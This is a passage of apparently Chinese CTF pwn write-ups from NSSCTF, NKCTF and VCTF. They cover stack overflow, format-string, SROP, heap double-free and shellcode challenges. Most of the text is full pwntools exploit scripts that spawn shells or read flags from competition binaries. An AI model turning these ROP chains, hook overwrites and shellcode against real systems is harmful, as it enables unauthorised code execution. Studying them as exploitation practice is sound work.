p += pack('<Q', 0x00000000004c50e0) # @ .data
p += pack('<Q', 0x0000000000447fe7) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000044a465) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000409f8e) # pop rsi ; ret
p += pack('<Q', 0x00000000004c50e8) # @ .data + 8
p += pack('<Q', 0x000000000043d1b0) # xor rax, rax ; ret
p += pack('<Q', 0x000000000044a465) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401f1f) # pop rdi ; ret
p += pack('<Q', 0x00000000004c50e0) # @ .data
p += pack('<Q', 0x0000000000409f8e) # pop rsi ; ret
p += pack('<Q', 0x00000000004c50e8) # @ .data + 8
p += pack('<Q', 0x0000000000451322) # pop rdx ; ret
p += pack('<Q', 0x00000000004c50e8) # @ .data + 8
p += pack('<Q', 0x000000000043d1b0) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000447fe7) # pop rax ; ret
p += p64(59)
p += pack('<Q', 0x0000000000401cd4) # syscall

pay = b''
#
for i in range(len(p)):
        pay += (ord(p[i:i+1])).to_bytes(1)
payload = b'a'*40 + pay
gdb.attach(p)
io.sendafter(b'ret2??\n', payload)

io.interactive()

BabyGift



存在栈溢出，查看汇编发现程序结束时rdi指向第二次输入的字符串，控制程序结束时调用printf函数便可以利用格式化字符串泄露出栈地址和libc地址，再调用main函数，控制第二次输入的字符串为/bin/sh，调用system函数即可拿到shell（偶尔printf函数调用失败，多试几次就可）

令人疑惑的是

刚开始做时没有泄露栈地址，把栈直接放在bss段了，也调用system函数了，但是调用posix_spawn后创建的子进程就莫名其妙中止了，把posix_spawn的参数和能正常得到shell的参数比较后感觉没啥差异，感觉可能是在创建子进程时对栈的作用使得bss段中某些不能改的东西改了，把栈放回原位就成功拿到shell

from ctypes import *
from pwn import *
for i in range(50):
	try:
		p = process('./vuln')
		#p = remote("xyctf.top",41584)
		context(log_level='debug',arch='amd64', os='linux')
		elf = ELF('./vuln')

		#gdb.attach(p)
		printf = 0x401080
		ret = 0x000000000040101a
		main = 0x40126A
		pay = b'a'*32
		p.sendafter("name:\n",pay)

		payload = b'aa%25$p-%26$p'
		p.sendafter("Your passwd:\n",payload.ljust(31,b'b') + p64(0x404000 + 0x600) + p64(ret) + p64(printf) + p64(main))

		p.recvuntil(b'0x')
		__libc_start_main = int(p.recv(12),16) - 128
		base = __libc_start_main - 0x29DC0
		print("base = ",hex(base))
		sys = base + 0x50D70
		
		p.recvuntil(b'0x')
		stack = int(p.recv(12),16)
		print("stack = ",hex(stack))

		#gdb.attach(p)
		#one = base + 0xebd43
		payload1 = b";/bin/sh"*3 + b'a'*7+ p64(stack-0x100+11*8) + p64(0x401288)
		p.sendline(payload1)
		
		
		payload2 = b"/bin/sh\x00"*4 + b'a'*8
		p.sendline(payload2 + p64(ret) + p64(sys))
		p.interactive()
	except:           
		p.close()

GuestBook

控制rsp最后一位，在栈上提前写好后门函数，很容易栈迁移到后门函数

from pwn import *
from LibcSearcher import *
context(os="linux", arch="amd64", log_level="debug")

for i in range(50):
	try:
		#p = process("./pwn")
		p = remote("xyctf.top",60462)
		elf = ELF("./pwn")
		libc = elf.libc

		#gdb.attach(p)
		sys = 0x40132B
		p.sendlineafter("index\n",b'32')
		p.sendlineafter("name:\n",p64(sys)*2)
		p.sendlineafter("id:\n",b'32')
		p.sendlineafter("index\n",b'-1')
		p.interactive()	
	except:           
		p.close()

simple_srop（srop和orw）

程序只有一个溢出了很多的read，程序给的read的长度我怕不过，所以先调用read函数在bss段写，同时也可以得知"./flag"字符串的地址,一个sigframe是256个字节（调试出来的）

from pwn import *
from LibcSearcher import *
context(os="linux", arch="amd64", log_level="debug")

#p = process("./vuln")
p = remote("192.168.43.159",62578)
elf = ELF("./vuln")

syscall = 0x40129d
bss = 0x404000 + 0x500
srop = 0x401297

#gdb.attach(p)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = bss
sigframe.rsp = bss + 0x10
sigframe.rdx = 0x1000
sigframe.rip = syscall

payload = b"a"*32 + p64(0) + p64(srop) + bytes(sigframe)
p.send(payload)
#pause()
sh = bss
flag = bss + 8
sigframe0 = SigreturnFrame()
sigframe0.rax = constants.SYS_open
sigframe0.rdi = flag
sigframe0.rsi = 0
sigframe0.rsp = bss + 0x10 + 256
sigframe0.rdx = 0
sigframe0.rip = syscall

sigframe1 = SigreturnFrame()
sigframe1.rax = constants.SYS_read
sigframe1.rdi = 3
sigframe1.rsi = bss - 0x100
sigframe1.rsp = bss + 0x10 + 256*2
sigframe1.rdx = 0x100
sigframe1.rip = syscall


sigframe2 = SigreturnFrame()
sigframe2.rax = constants.SYS_write
sigframe2.rdi = 1
sigframe2.rsi = bss - 0x100
sigframe2.rsp = bss + 0x10 + 256*3
sigframe2.rdx = 0x100
sigframe2.rip = syscall

pay = b"/bin/sh\00" + b"./flag\x00\x00" + p64(srop) + bytes(sigframe0) + p64(srop) + bytes(sigframe1) + p64(srop) + bytes(sigframe2)
p.send(pay)
p.interactive()

fmt


开局送你libc地址，还有后门函数，然后有个scanf的格式化字符串，可以实现任意地址写，没有栈地址所以没法改返回地址，可以打exit hook，学习链接：https://www.cnblogs.com/pwnfeifei/p/15759130.html

由此我们可以想到两个方法来 get shell

1.一个是改 rtld_lock_default_lock_recursive 或 rtld_lock_default_unlock_recursive 为 one_gadget
2.另一个更通用就是改 rtld_lock_default_lock_recursive 和rtld_lock_default_unlock_recursive 为 system ，并且把 _rtld_global._dl_load_lock.mutex的值改为 /bin/sh\x00

找hook偏移

p _rtld_global命令，但这道题这个命令貌似不太管用，在网上硬找到了偏移，本地2.31的_rtld_global地址：

0x7ffff7ffdf60 <_rtld_global+3840>:    0x0000000000000000    0x00007ffff7fd0150
0x7ffff7ffdf70 <_rtld_global+3856>:    0x00007ffff7fd0160    0x0000000000000000

from pwn import *
from LibcSearcher import *
context(os="linux", arch="amd64", log_level="debug")

p = process("./vuln")
#p = remote("192.168.163.1",52045)
elf = ELF("./vuln")
ld = ELF("./vuln")
libc = elf.libc
sys = 4199110#0x4012C6
system = 4198560#0x4010A0
sh = 4202558#0x40203E

gdb.attach(p)
p.recvuntil(b"0x")
base = int(p.recv(12),16) - 0x61CC0
print("base = ",hex(base)) #
ld_base = base + 2236416
print("ld_base = ",hex(ld_base))
_dl_rtld_lock_recursive = ld_base + 0xf60 + 8
_dl_rtld_unlock_recursive = _dl_rtld_lock_recursive + 8
_dl_load_lock = _dl_rtld_unlock_recursive - 0x608
__libc_atexit = base + 0x1ED608

onegadget = [0xe3b2e,0xe3b31,0xe3b34]
one_gadget = base + onegadget[0]

p.sendline(b"%8$lld%9$lldaaaa" + p64(_dl_rtld_lock_recursive) + p64(_dl_load_lock))

pause()
p.sendline(str(system) + " " + str(sh))

p.interactive()

#0xe3b2e execve("/bin/sh", r15, r12)
#constraints:
#  [r15] == NULL || r15 == NULL || r15 is a valid argv
#  [r12] == NULL || r12 == NULL || r12 is a valid envp

#0xe3b31 execve(https://l1u66.github.io//post-images/1714566464339.png)
#constraints:
#  [r15] == NULL || r15 == NULL || r15 is a valid argv
#  [rdx] == NULL || rdx == NULL || rdx is a valid envp
#
#0xe3b34 execve("/bin/sh", rsi, rdx)
#constraints:
#  [rsi] == NULL || rsi == NULL || rsi is a valid argv
#  [rdx] == NULL || rdx == NULL || rdx is a valid envp

malloc_flag

额，申请一个0x100的堆块，然后show就有flag....甚至不用写脚本

Intermittent

程序把输入的shellcode前12个字节每四个字节弄一起
如图

rep movsb指令

这个指令可以让rsi寄存器的地址开始rcx的字节数据赋值给rdi地址所
指的区域
该题可以通过栈（两个字节，在rdi中写入rdx中的0x114514000），从而写入连续的shellcode

mov movabs区别

movabs 和 mov 是 x86 汇编语言中的两条指令，用于将数据从一个位置移动到另一个位置。它们的区别在于操作数的大小和范围。
1.mov 指令只能用于将数据从一个寄存器或内存位置移动到另一个寄存器或内存位置。它可以处理 8 位、16 位、32 位或 64 位的数据。
2.movabs 指令是一个专门用于处理 64 位数据的指令，它用于将 64 位数据直接加载到寄存器中，而不需要使用其他寄存器作为中间传递。这个指令通常用于处理超过 32 位的整数或地址。
因此，movabs 指令主要用于处理 64 位数据，而 mov 指令可以用于处理不同大小的数据。

from pwn import *
from LibcSearcher import *
context(os="linux", arch="amd64", log_level="debug")

p = process("./vuln")
#p = remote("xyctf.top",44777)
elf = ELF("./vuln")
libc = elf.libc

#gdb.attach(p)
shellcode1 = b'\x52\x5F\xF3\xA4'
shellcode = shellcode1+b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

p.send(shellcode.ljust(0x100,b"\x90"))

p.interactive()

或者

0x0000000000000000:  52       push    rdx
0x0000000000000001:  5E       pop     rsi
0x0000000000000002:  0F 05    syscall

极限调用read再次读取shellcode

fastfastfast（double free）

2.31的libc，存在uaf考虑fast bin double free,劫持malloc hook

from pwn import *
from LibcSearcher import *
context(os="linux", arch="amd64", log_level="debug")

p = process("./vuln")
#p = remote("xyctf.top",44777)
elf = ELF("./vuln")
libc = elf.libc

def add(idx,data):
	p.sendlineafter(">>> ", "1")
	p.sendlineafter("idx\n", str(idx))
	p.sendafter("content\n", data)
    	
def dele(idx):
	p.sendlineafter(">>> ", "2")
	p.sendlineafter("idx\n", str(idx))

def view(idx):
	p.sendlineafter(">>> ", "3")
	p.sendlineafter("idx\n", str(idx))
	
#gdb.attach(p)
for i in range(0xf):
	add(i,b'a'*8)
for i in range(8):
	dele(i)
dele(8)
dele(7)
for i in range(7):
	add(i,b'a'*8)
add(9,p64(0x404070))

add(10,b'b')
add(11,b'c')
add(12,b'\x00')

view(12)
base = u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00')) - 2021024
print("base = ",hex(base))
#pause()
onegadget = [0xe3b2e,0xe3b31,0xe3b34]
one_gadget = base + onegadget[1]
malloc_hook = base + (0x7f291e7a2b70-0x7f291e5b6000 )

for i in range(0xf):
	add(i,b'a'*8)
for i in range(8):
	dele(i)
dele(8)
dele(7)

for i in range(7):
	add(i,p64(0))

add(9,p64(malloc_hook))

add(10,b'b')
add(11,b'c')
print("malloc_hook = ",hex(malloc_hook))
#pause()
add(12,p64(one_gadget))
p.sendlineafter(">>> ", "1")
p.sendlineafter("idx\n", str(1))
p.interactive()

entry.title: NSSCTF Round#21 Basic
entry.content:
fmt_checkin

经典格式化字符串,存在system函数，将printf的got表换成system的plt表即可

from ctypes import *
from pwn import *

#p = process('./fmt_checkin')

context(log_level='debug',arch='amd64', os='linux')

#gdb.attach(p)
sys = 0x401265
p.sendlineafter("send\n",b'-1')
p.sendlineafter("payload\n",b"%13$p")
p.recvuntil(b"0x")
stack = int(p.recv(12),16) - 272 + 16
print("stack = ",stack)
s1 = stack & 0xffff
p.sendlineafter("payload\n",b"%" + str(s1).encode("utf-8") + b"c%13$hn")

p.sendlineafter("payload\n",b"%4198624c%11$ln")
p.sendlineafter("payload\n",b"/bin/sh")

p.interactive()

Za1Yunti4n

这个题，emmmmm，用C++写的，代码非常多，分析程序发现只要购买到小卖部就可以拿到shell，看三次战队vip就可以把自己的钱变成负数，买到小卖部，不用脚本

entry.title: NKCTF
entry.content:
leek


发现先读取了6个字符，然后使用stdout的实际地址对每个字符取余，信安数基刚学了孙子定理(中国剩余定理)，网上直接有现成的python脚本，然后猜libc版本（恶心至极），利用栈溢出拿到shell

from pwn import*
from LibcSearcher import *
import math
#p = process("./leak")
p = remote("node.nkctf.yuzhian.com.cn",31660)
elf = ELF("./leak")
libc = elf.libc
context(log_level='debug',arch='amd64',os='linux')

def Get_Mi(m_list, m):
    M_list = []
    for mi in m_list:
        M_list.append(m // mi)
    return M_list


def Get_resMi(M_list, m_list):
    resM_list = []
    for i in range(len(M_list)):
        resM_list.append(Get_ni(M_list[i], m_list[i])[0])
    return resM_list


def Get_ni(a, b):
    if b == 0:
        x = 1
        y = 0
        q = a
        return x, y, q
    ret = Get_ni(b, a % b)
    x = ret[0]
    y = ret[1]
    q = ret[2]
    temp = x
    x = y
    y = temp - a // b * y
    return x, y, q


def result(a_list, m_list):
    for i in range(len(m_list)):
        for j in range(i + 1, len(m_list)):
            if 1 != math.gcd(m_list[i], m_list[j]):
                print("不能直接利用中国剩余定理")
                return
    m = 1
    for mi in m_list:
        m *= mi
    Mi_list = Get_Mi(m_list, m)
    Mi_inverse = Get_resMi(Mi_list, m_list)
    x = 0
    for i in range(len(a_list)):
        x += Mi_list[i] * Mi_inverse[i] * a_list[i]
        x %= m
    return x


if __name__ == '__main__':
	#gdb.attach(p)
	payload = b'\x65' + b'\x67' + b'\x6b' + b'\x6d' + b'\x71' + b'\x7f'
	p.sendafter("secret\n",payload)
	a_list = [1,2,3,4,5,6]
	for i in range(0,6):
		a_list[i] = ord(p.recv(1))
		
	t = ord(p.recv(1))
	m_list = [0x65,0x67,0x6b,0x6d,0x71,0x7f]
	print(a_list)
	print(t)
	print("最终结果为：")
	out = result(a_list, m_list)
	while out%0x1000!=0x780:
		out += 0x195682D1EC3
	print(hex(out))
	base = out - libc.sym['_IO_2_1_stdout_']
	print(hex(base))
	sys = base + 0x50D70
	sh = base + 0x1D8678
	t += 11*8
	rdi = base + 0x2a3e5
	ret = base + 0x29139
	payload = p64(ret) + p64(rdi) + p64(sh) + p64(sys) + p8(t)
	#pause()
	p.send(payload)

p.interactive()

maimai

前面有个判断逻辑，随便填了填就能过去，利用格式化字符串泄露cannary和libc地址，利用栈溢出拿到shell，但是拿到shell后发现open被ban掉了，没有打开flag的权限，所以在调用system函数前调用setuid(0)函数提权（关于这一点在begingame中的unhappy那道题中有提及，但是当时复现时看了眼wp得知要用orw，所以直接用orw来做了，没管提权的事，以后再也不看wp做题了🤡）

from pwn import *
from LibcSearcher import *
#context(os="linux", arch="amd64", log_level="debug")
#p = process('./pwn')
p = remote("node.nkctf.yuzhian.com.cn",32996)

#gdb.attach(p)
p.sendlineafter(b"option:\n",b'1')
sleep(1)
for i in range(49):
	p.sendline(b"15.0 SSS+")
	
p.sendlineafter("rank.\n",b"15.0 SS")
p.sendlineafter(b"option:\n",b'2')
#pause()
p.sendlineafter(b"nickname.\n",b'%11$p')
p.recvuntil("0x")
can = int(p.recv(16),16)
print("can  =",hex(can))

p.sendlineafter(b"maimai?\n",b'aaaaaaaa')
p.sendlineafter(b"option:\n",b'2')
p.sendlineafter(b"nickname.\n",b'%13$p')
p.recvuntil("0x")
libc = int(p.recv(12),16) + 0x30 - 0x29dc0
print("libc  =",hex(libc))

rdi = libc + 0x2a3e5
rdx = libc + 0x11f2e7
rsi = libc + 0x2be51
ret = libc + 0x29139
sh = libc + 0x1D8678
sys = libc + 0x50D70
uid = libc + 0xEC0D0

payload = b'a'*40 + p64(can) + p64(0xdeadbeef) + p64(rdi) + p64(0) + p64(uid) + p64(rdi) + p64(sh)  + p64(sys) 
#pause()
p.sendlineafter(b"maimai?\n",payload)

p.interactive()

pallu

比赛的时候就没看到gift这里末尾没置0🤡，就看到设置标签时可能有个溢出，学习wp后发现是通过gift泄露libc基地址和栈地址，通过起名也能泄露堆地址，主要攻击思路就是把在栈上申请堆块，控制执行流

from pwn import *
from LibcSearcher import *
context(os="linux", arch="amd64", log_level="debug")
p = process('./pallu')

def get(idx):
	p.sendlineafter("choice:", b"1")
	p.sendlineafter("index:", str(idx))

def gift(content):
	p.sendlineafter("choice:", b"8")
	p.sendlineafter("code:", content)
    	
def kill(idx):
	p.sendlineafter("choice:", b"5")
	p.sendlineafter("x:", str(idx))

def sset(idx, content):
	p.sendlineafter("choice:", b"2")
	p.sendlineafter("x:", str(idx))
	p.sendlineafter("Labels:", content)
	
def breed(idx1,idx2,content):
	p.sendlineafter("choice:", b"4")
	p.sendlineafter("x:", str(idx1))
	p.sendlineafter("x:", str(idx2))
	p.sendlineafter("(y/n)", b'y')
	p.sendafter("name:", content)
def exit_():
	p.sendlineafter("choice:", b"10")


#gdb.attach(p)
gift(b'a'*15)
libc = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) - 0x3c38e0
print("libc = ",hex(libc))
gift(b'a'*71)
stack = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) - 0x20
print("stack = ",hex(stack))

get(1)#0x500
get(2)#0x930
breed(0,1,b'h'*0x10)
p.recvuntil(b'h'*0x10)
p.recvuntil(b'h'*0x10)
heap = u64(p.recv(6).ljust(8,b'\x00')) - 0x950
print("heap = ",hex(heap))
kill(2)
kill(1)
kill(0)
get(3) 
get(3) 
kill(0) 
get(1) 
get(1) 
kill(2) 
sset(0,b'g'*0x500+p64(0)+p64(0x221)+p64(0x7f8796c7ad78-0x7f87968b7000+libc)+p64(stack-0x30))
giftcode=b'Happy NKCTF2024!'
giftcode=giftcode.ljust(0x10,b'\0')
giftcode+=p64(0)+p64(0)+p64(stack-0x30)+p64(0)
giftcode+=p64(0)+p64(0)+p64(heap)+p64(stack-0x50)

gift(giftcode)
#pause()
print("send giftcode2")
gift(b'Welcome PalluWorld!')

one=libc+0x4525a

sset(3,b'\x00'*4*8+p64(0xdeadbe00)+p64(one)+p64(0)*10)

exit_()

p.interactive()

entry.title: VCTF纳新赛
entry.content:
ezhp_code

add函数


程序有后门函数，并且add功能中存在漏洞

如果a1+40的位置有值，则直接执行，但是程序在del功能中将该位置置0，但是未对内容的堆清零，所以设法把内容chunk分配给漏洞chunk，但是按tchace的先进后出特性无法实现，发现限制8个chunk，所以把tchace堆填满即可实现

from pwn import *
from LibcSearcher import *
context(os="linux", arch="amd64", log_level="debug")
p = process('./pwn')
sys = 0x4012A5

def add(size):
	p.sendlineafter("exit\n", "1")
	p.sendlineafter("name:\n", b'a'*40 + p64(sys))
	p.sendlineafter("say:\n", str(size))
	p.sendlineafter("say:\n", b'a'*40 + p64(sys))
    	
def dele():
	p.sendlineafter("exit\n", "2")
	
#gdb.attach(p)
add(71)
add(71)
add(71)
add(71)
dele()
dele()
dele()
dele()
#pause()
p.sendlineafter("exit\n", "1")

#pause()
p.interactive()
